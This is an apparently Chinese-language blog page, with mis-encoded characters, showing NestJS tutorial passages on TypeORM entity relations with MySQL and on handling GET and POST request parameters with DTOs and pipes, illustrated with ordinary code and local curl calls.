<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.entity.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    ManyToOne,</span><br><span class="line">    <span class="comment">// Entity...</span></span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">'typeorm'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Classes &#125; <span class="keyword">from</span> <span class="string">'./classes.entity'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> Student &#123;</span><br><span class="line">  <span class="comment">// id name updateDate, createDate...</span></span><br><span class="line">  <span class="meta">@ManyToOne</span>(<span class="function"><span class="params">()</span> =&gt;</span> Classes, <span class="function"><span class="params">classes</span> =&gt;</span> classes.students)</span><br><span class="line">  <span class="keyword">class</span>: Classes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ï¼š<code>classes</code> è¡¨å¼•ç”¨ <code>students</code> æ˜¯é€šè¿‡æ–°å»ºå­—æ®µ(<code>students\class</code>)è¿›è¡Œå…³è”ã€‚</p>
<p>å¼•ç”¨ä¼šæœ€ç»ˆåœ¨æ•°æ®åº“å˜æˆ<code>å¤–é”®</code>è¿æ¥ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">show create table student;</span><br><span class="line">// =&gt;  CREATE TABLE `student` (</span><br><span class="line">//   `id` int NOT NULL AUTO_INCREMENT,</span><br><span class="line">//   `name` varchar(255) NOT NULL,</span><br><span class="line">//   `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),</span><br><span class="line">//   `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),</span><br><span class="line">//   `classId` int DEFAULT NULL,    // ğŸ‘ˆ æ³¨æ„è¿™é‡Œ</span><br><span class="line">//   PRIMARY KEY (`id`),</span><br><span class="line">//   KEY `FK_bd5c8f2ef67394162384a484ba1` (`classId`), // ğŸ‘ˆ æ³¨æ„è¿™é‡Œ</span><br><span class="line">//   CONSTRAINT `FK_bd5c8f2ef67394162384a484ba1` FOREIGN KEY (`classId`) REFERENCES `classes` (`id`) // ğŸ‘ˆ æ³¨æ„è¿™é‡Œ</span><br><span class="line">// ) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// è€Œ classes è¡¨å¹¶æ— é“¾æ¥</span><br><span class="line">show create table classes;</span><br><span class="line">// CREATE TABLE `classes` (</span><br><span class="line">//   `id` int NOT NULL AUTO_INCREMENT,</span><br><span class="line">//   `className` varchar(255) NOT NULL,</span><br><span class="line">//   `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),</span><br><span class="line">//   `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),</span><br><span class="line">//   PRIMARY KEY (`id`)</span><br><span class="line">// ) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br></pre></td></tr></table></figure>
<p>å†å¼•å…¥è¡¨ï¼Œè¯¦ç»†æ“ä½œå¯çœ‹ç¬¬å››æ­¥ã€‚</p>
<p><code>students.module.ts</code> å¼•å…¥è¡¨<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.module.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Classes &#125; <span class="keyword">from</span> <span class="string">'./entities/classes.entity'</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">    imports: [TypeOrmModule.forFeature([Student, Classes])],</span><br><span class="line">    providers: [StudentsService, Student, Classes],</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsModule &#123;&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>students.service.ts</code> å¼•å…¥è¡¨, å¹¶å®ç° <code>setClass</code>, <code>getClass</code> æ–¹æ³•</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Classes &#125; <span class="keyword">from</span> <span class="string">'./entities/classes.entity'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsService &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">        <span class="meta">@InjectRepository</span>(Student)</span></span><br><span class="line"><span class="params">        <span class="keyword">private</span> readonly studentRepository: Repository&lt;Student&gt;,</span></span><br><span class="line"><span class="params">        <span class="meta">@InjectRepository</span>(Classes)</span></span><br><span class="line"><span class="params">        <span class="keyword">private</span> readonly classRepository: Repository&lt;Classes&gt;,</span></span><br><span class="line"><span class="params">    </span>) &#123;&#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">     <span class="keyword">async</span> setClass(name: <span class="built_in">string</span>, studentIds: <span class="built_in">number</span>[]) &#123;</span><br><span class="line">        <span class="keyword">const</span> students = <span class="keyword">await</span> <span class="keyword">this</span>.studentRepository.find(&#123; where: studentIds &#125;);</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="keyword">this</span>.classRepository.save(&#123;</span><br><span class="line">            className: name,</span><br><span class="line">            students: students, <span class="comment">// æ­¤å¤„ç›´æ¥ä¿å­˜students çš„å®ä¾‹ï¼Œå³ç›´æ¥ä»æ•°æ®åº“å–å‡ºæ¥çš„æ•°æ®</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">async</span> findClass(id: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="keyword">this</span>.classRepository.find(&#123;</span><br><span class="line">            where: &#123; id &#125;,</span><br><span class="line">            relations: [<span class="string">'students'</span>]</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>students.controller.ts</code> ä¿®æ”¹<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.controller.ts</span></span><br><span class="line"><span class="comment">// import ...</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsController &#123;</span><br><span class="line">    <span class="comment">// constructor ...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Get</span>(<span class="string">'get-class'</span>)</span><br><span class="line">    getClass(<span class="meta">@Query</span>(<span class="string">'id'</span>, ParseIntPipe) id: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.studentsService.findClass(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Post</span>(<span class="string">'set-class'</span>)</span><br><span class="line">    setClass(<span class="meta">@Body</span>() classes: ClassesDto) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.studentsService.setClass(classes.className, classes.students);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li><code>ClassesDto</code><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// classes.dto.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; IsNotEmpty, IsString &#125; <span class="keyword">from</span> <span class="string">'class-validator'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> ClassesDto &#123;</span><br><span class="line">    <span class="meta">@IsNotEmpty</span>()</span><br><span class="line">    <span class="meta">@IsString</span>()</span><br><span class="line">    className: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">    students: <span class="built_in">number</span>[]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><code>è°ƒç”¨æ¥å£</code>ï¼Œå…ˆæ’å…¥æ•°æ®å†æŸ¥è¯¢æ•°æ®ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// å†æ–°å¢ä¸€æ¡æ•°æ®</span><br><span class="line">curl -X POST http://127.0.0.1:3000/students/<span class="built_in">set</span>-student-name -H <span class="string">'Content-Type: application/json'</span> -d <span class="string">'&#123;"user": "gdccwxx1"&#125;'</span></span><br><span class="line"></span><br><span class="line">// æ’å…¥ classes æ•°æ®</span><br><span class="line">curl -X POST http://127.0.0.1:3000/students/<span class="built_in">set</span>-class -H <span class="string">'Content-Type: application/json'</span> -d <span class="string">'&#123;"className": "blog", "students": [1,2]&#125;'</span></span><br><span class="line"></span><br><span class="line">// é€šè¿‡æµè§ˆå™¨ï¼ŒæŸ¥è¯¢é•¿å•¥æ ·</span><br><span class="line">http://localhost:3000/students/get-class?id=1</span><br><span class="line">// =&gt; [&#123;</span><br><span class="line">//  id: 1,</span><br><span class="line">    className: <span class="string">"blog"</span>,</span><br><span class="line">    updateDate: <span class="string">"2021-09-15T01:05:38.055Z"</span>,</span><br><span class="line">    createDate: <span class="string">"2021-09-15T01:05:38.055Z"</span>,</span><br><span class="line">    students: [&#123;</span><br><span class="line">        id: 1,</span><br><span class="line">        name: <span class="string">"gdccwxx"</span>,</span><br><span class="line">        updateDate: <span class="string">"2021-09-15T01:05:38.000Z"</span>,</span><br><span class="line">        createDate: <span class="string">"2021-09-15T01:05:23.988Z"</span></span><br><span class="line">    &#125;,&#123;</span><br><span class="line">        id: 2,</span><br><span class="line">        name: <span class="string">"gdccwxx1"</span>,</span><br><span class="line">        updateDate: <span class="string">"2021-09-15T01:05:38.000Z"</span>,</span><br><span class="line">        createDate: <span class="string">"2021-09-15T01:05:28.084Z"</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;]   âœ…</span><br></pre></td></tr></table></figure>
<h1 id="ä¸ƒã€ç®€å•å›é¡¾"><a href="#ä¸ƒã€ç®€å•å›é¡¾" class="headerlink" title="ä¸ƒã€ç®€å•å›é¡¾"></a>ä¸ƒã€ç®€å•å›é¡¾</h1><p>å†å›é¡¾ä¸‹æœ¬ç« ï¼š</p>
<ul>
<li>ä½¿ç”¨ <code>typeorm</code> å’Œ <code>mysql</code> å»ºç«‹è¿æ¥</li>
<li>ä½¿ç”¨ <code>entity</code> æ–‡ä»¶åˆ›å»ºæ•°æ®åº“è¡¨</li>
<li><code>service</code> ä½¿ç”¨å¯¹æ•°æ®åº“çš„ç®€å•è°ƒç”¨ï¼ŒåŒ…æ‹¬<code>å†™å…¥</code>å’Œ<code>è¯»å–</code></li>
<li>ä½¿ç”¨å…³ç³»æŸ¥è¯¢ï¼Œå°† <code>student</code> å’Œ <code>classes</code> è¿æ¥å†™å…¥å’ŒæŸ¥è¯¢</li>
</ul>
<p>è‡³æ­¤ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>typeorm</code> å’Œ <code>mysql</code> è¿æ¥æ•°æ®åº“å°±å®Œæˆäº†ã€‚</p>
<p>å®Œæ•´ç¤ºä¾‹å¯ä»¥åœ¨ <a href="https://github.com/gdccwxx/nest-test" target="_blank" rel="noopener">github</a> æ‰¾åˆ°ã€‚</p>
<p>ä¸‹ç« æˆ‘ä»¬å°†ä¸»è¦è®² <code>NestJs</code> çš„é«˜çº§ç”¨æ³•ï¼ŒåŒ…æ‹¬ <code>ç®¡é“</code>ã€<code>å®ˆå«</code>å’Œ<code>æ‹¦æˆªå™¨</code>ã€‚æœŸå¾…ä½ çš„é˜…è¯»ã€‚</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/nestJs/nest-js-tutorial-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/nestJs/nest-js-tutorial-2/" itemprop="url">NestJs å…¥é—¨æ•™ç¨‹ä¹‹äºŒï¼šå¤„ç†è¯·æ±‚</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2021-09-12T10:06:06+08:00">
                2021-09-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>è¿™ä¸ªç³»åˆ—çš„<a href="/nestJs/nest-js-tutorial-1/" title="ä¸Šä¸€ç¯‡">ä¸Šä¸€ç¯‡</a>æ–‡ç« ï¼Œæ•™å¤§å®¶å†™äº† hello world å’Œ æ–°å»º students æ¨¡å—ã€‚</p>
<p>ä½†æ˜¯ï¼Œé‚£åªæ˜¯å¾ˆå¹²çš„ Get è¯·æ±‚ã€‚æ¥ç€å¾€ä¸‹è®²ï¼Œå¦‚ä½•ç»™æ¥å£åšå‚æ•°æ£€æŸ¥ã€æ·»åŠ æ—¥å¿—å’Œä½¿ç”¨ Post æ–¹æ³•ã€‚</p>
<p>å®Œæ•´ç¤ºä¾‹å¯ä»¥åœ¨ <a href="https://github.com/gdccwxx/nest-test" target="_blank" rel="noopener">github</a> æ‰¾åˆ°ã€‚</p>
<p><img src="/nestJs/nest-js-tutorial-2/./nestjs.png" alt="nestjs"></p>
<h1 id="ä¸€ã€Post-è¯·æ±‚"><a href="#ä¸€ã€Post-è¯·æ±‚" class="headerlink" title="ä¸€ã€Post è¯·æ±‚"></a>ä¸€ã€Post è¯·æ±‚</h1><p>ç»è¿‡ä¸Šç¯‡çš„ä»‹ç»ï¼Œæ€»ä½“è¯·æ±‚å…ˆä¼šç»è¿‡ students.controller.ts -&gt; å†åˆ° students.service.tsã€‚</p>
<p>åœ¨ students.service.ts ä¸Šæ–°å¢ <code>Post</code> æ–¹æ³•<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.service.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Controller, Get, Post &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">'students'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsController &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"><span class="keyword">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// @Get('who-are-you') ...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Post</span>(<span class="string">'who-are-you'</span>)</span><br><span class="line">    whoAreYouPost() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.studentsService.ImStudent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>é€šè¿‡ curl è®¿é—®åœ°å€<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST  http://127.0.0.1:3000/students/who-are-you</span><br><span class="line">// =&gt; Im student% âœ…</span><br></pre></td></tr></table></figure></p>
<p>é€šè¿‡æ›¿æ¢è£…é¥°å™¨ï¼Œå°±å¯ä»¥å¿«é€Ÿå®ç° <code>Post</code> è¯·æ±‚ã€‚</p>
<h1 id="äºŒã€è¯·æ±‚å‚æ•°"><a href="#äºŒã€è¯·æ±‚å‚æ•°" class="headerlink" title="äºŒã€è¯·æ±‚å‚æ•°"></a>äºŒã€è¯·æ±‚å‚æ•°</h1><p>æ­£å¸¸è¯·æ±‚éƒ½ä¼šåŠ ä¸Šå‚æ•°ï¼Œ<code>Get</code> å’Œ <code>Post</code> æ–¹æ³•åŠ å‚æ•°ç•¥æœ‰ä¸åŒã€‚</p>
<p>å…ˆçœ‹ Get è¯·æ±‚</p>
<h2 id="Get-è¯·æ±‚å‚æ•°"><a href="#Get-è¯·æ±‚å‚æ•°" class="headerlink" title="Get è¯·æ±‚å‚æ•°"></a>Get è¯·æ±‚å‚æ•°</h2><p>Get è¯·æ±‚çš„å‚æ•°ä¸€èˆ¬ä¼šæ”¾åœ¨ URL ä¸Šï¼Œè¿™æ˜¯ <code>@Query</code> è£…é¥°å™¨å°±æ´¾ä¸Šç”¨åœºäº†ã€‚</p>
<p>å…ˆæ”¹é€  controller</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.controller.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Controller, Get, Post, Query &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">'students'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsController &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"><span class="keyword">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Get</span>(<span class="string">'who-are-you'</span>)</span><br><span class="line">    whoAreYou(<span class="meta">@Query</span>(<span class="string">'name'</span>) name: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.studentsService.ImStudent(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å†æ”¹é€  service</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.service.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Injectable &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsService &#123;</span><br><span class="line">    ImStudent(name?: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Im student '</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡æµè§ˆå™¨è®¿é—® url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3000/students/who-are-you?name=gdccwxx</span><br><span class="line">// =&gt; Im student gdccwxx  âœ…</span><br></pre></td></tr></table></figure></p>
<p>è¿™æ · Get è¯·æ±‚å°±èƒ½è·å–åˆ° name å‚æ•°äº†</p>
<h2 id="Post-å‚æ•°"><a href="#Post-å‚æ•°" class="headerlink" title="Post å‚æ•°"></a>Post å‚æ•°</h2><p>Post å‚æ•°æœ‰äº›ä¸åŒï¼Œä¼šç”¨åˆ° <a href="https://baike.baidu.com/item/DTO/16016821" target="_blank" rel="noopener">DTO</a> çš„ä¼ è¾“ã€‚å› ä¸ºæ•°æ®é€šè¿‡ HTTP ä¼ è¾“æ˜¯æ–‡æœ¬ç±»å‹ï¼Œå› æ­¤éœ€è¦å°†æ–‡æœ¬ç±»å‹è½¬åŒ–æˆä»£ç å¯è¯†åˆ«çš„å˜é‡ã€‚</p>
<p>æ–°å»º students.dto.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/students/dtos/students.dto.ts</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentDto &#123;</span><br><span class="line">    name: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>ç¼–è¾‘ students.controller.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.controller.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Body, Controller, Get, Post, Query &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; StudentDto &#125; <span class="keyword">from</span> <span class="string">'./dtos/students.dto'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; StudentsService &#125; <span class="keyword">from</span> <span class="string">'./students.service'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">'students'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsController &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"><span class="keyword">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// @Get('who-are-you') ...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Post</span>(<span class="string">'who-are-you'</span>)</span><br><span class="line">    whoAreYouPost(<span class="meta">@Body</span>() student: StudentDto) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.studentsService.ImStudent(student.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>å‘½ä»¤è¡Œè®¿é—®<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -d&quot;name=gdccwxx&quot;  http://127.0.0.1:3000/students/who-are-you</span><br><span class="line">// =&gt; Im student gdccwxx%  âœ…</span><br></pre></td></tr></table></figure></p>
<p>post æ–¹æ³•ä¼ é€’çš„å‚æ•°æ˜¯é€šè¿‡è¯·æ±‚ body ç»™åˆ°åå°çš„ã€‚éœ€è¦é€šè¿‡ <code>@Body</code> è£…é¥°å™¨è§£æ Body ä¸­çš„æ•°æ®ã€‚</p>
<h1 id="ä¸‰ã€å‚æ•°é™åˆ¶ä¸è½¬æ¢"><a href="#ä¸‰ã€å‚æ•°é™åˆ¶ä¸è½¬æ¢" class="headerlink" title="ä¸‰ã€å‚æ•°é™åˆ¶ä¸è½¬æ¢"></a>ä¸‰ã€å‚æ•°é™åˆ¶ä¸è½¬æ¢</h1><p>è¿™éƒ¨åˆ†å…¶å®ç”¨åˆ°äº† <a href="https://docs.nestjs.com/pipes" target="_blank" rel="noopener">ç®¡é“</a> çš„æ¦‚å¿µï¼Œæˆ‘ä»¬ç”¨åŸºç¡€ç®¡é“æ¥å®ç°ï¼Œæ›´é«˜é˜¶ç”¨æ³•å°†ä¼šæ”¾åœ¨ç¬¬å››ç« ä¸­</p>
<h2 id="Get-è¯·æ±‚"><a href="#Get-è¯·æ±‚" class="headerlink" title="Get è¯·æ±‚"></a>Get è¯·æ±‚</h2><p>get è¯·æ±‚éœ€è¦ç”¨åˆ° <code>ParseIntPipe</code>, æ›´å¤šçš„å†…ç½®ç®¡é“åˆ—è¡¨å¯æŸ¥çœ‹<a href="https://docs.nestjs.com/pipes#built-in-pipes" target="_blank" rel="noopener">è¿™é‡Œ</a></p>
<p>æµè§ˆå™¨è®¿é—®çš„ url é»˜è®¤æ˜¯ string ç±»å‹ï¼Œ<code>ParseIntPipe</code> ç®¡é“èƒ½å°† string ç±»å‹è½¬åŒ–æˆ number ç±»å‹</p>
<p>è¿™æ¬¡æˆ‘ä»¬å®ç°çš„æ˜¯é€šè¿‡ id æŸ¥æ‰¾å­¦ç”Ÿå§“åã€‚</p>
<p>ä¿®æ”¹ students.service.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.service.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Injectable &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsService &#123;</span><br><span class="line">    <span class="comment">// ImStudent...</span></span><br><span class="line"></span><br><span class="line">    getStudentName(id: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> ID_NAME_MAP = &#123;</span><br><span class="line">            <span class="number">1</span>: <span class="string">'gdccwxx'</span>,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ID_NAME_MAP[id] ?? <span class="string">'not found'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
